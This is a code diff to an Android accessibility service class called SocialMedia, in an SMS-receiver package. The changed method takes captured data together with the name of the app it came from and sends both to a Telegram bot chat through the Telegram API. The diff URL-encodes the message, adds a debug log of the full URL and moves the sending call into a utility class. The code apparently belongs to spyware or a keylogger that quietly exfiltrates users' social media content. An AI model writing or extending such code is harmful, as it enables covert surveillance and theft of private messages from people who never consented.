@@ -8,10 +8,15 @@ import android.util.Log;
 import android.view.KeyEvent;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+import android.widget.Toast;
+
 import androidx.annotation.RequiresApi;
 
+import java.io.UnsupportedEncodingException;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
 import java.util.Date;
 
 import br.com.helpdev.smsreceiver.SavePref;
@@ -264,11 +269,19 @@ public class SocialMedia extends AccessibilityService {
         String chatid = pref.getChatid();
         String body = data+"^^"+pkg;
         String turl = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=";
-        String result = turl + chatid + "&text=" + body;
+        String result = null;
+        try {
+            result = turl + chatid + "&text=" + URLEncoder.encode(body, "UTF-8");
+        } catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
+            Toast.makeText(this, "unSupported URL", Toast.LENGTH_SHORT).show();
+        }
+
+        Log.e("lalala", "from sm "+result);
         URL url = new URL(result);
         assert chatid != null;
         if (!chatid.equalsIgnoreCase("nochatid" ) ){
-            new SMSReceiver().sendGet(url);
+            new UtilClass().sendGet(url);
         }
 
     }
